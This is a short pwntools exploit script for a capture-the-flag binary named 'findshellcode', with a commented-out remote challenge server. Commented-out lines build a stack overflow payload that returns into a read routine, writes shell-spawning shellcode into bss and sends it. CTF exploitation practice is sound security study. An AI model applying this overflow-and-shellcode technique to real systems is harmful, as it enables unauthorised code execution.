from pwn import *


context.terminal = ['tmux', 'splitw', '-h']
context(arch='i386', os='Linux', log_level='debug')

p = process('./findshellcode')
# p = remote('pwn1.0ops.sjtu.cn', 10004)
gdb.attach(p)

# bss = 0x0804919C
# read_addr = 0x080480FD
# shellcode = asm(shellcraft.sh())

# payload = b'A' * 0x30 + p32(read_addr) + p32(bss) + p32(0) + p32(bss) + p32(len(shellcode))
# p.sendlineafter(b'(code):', payload)
# p.sendafter(b'Luck!\n', shellcode)

p.interactive()
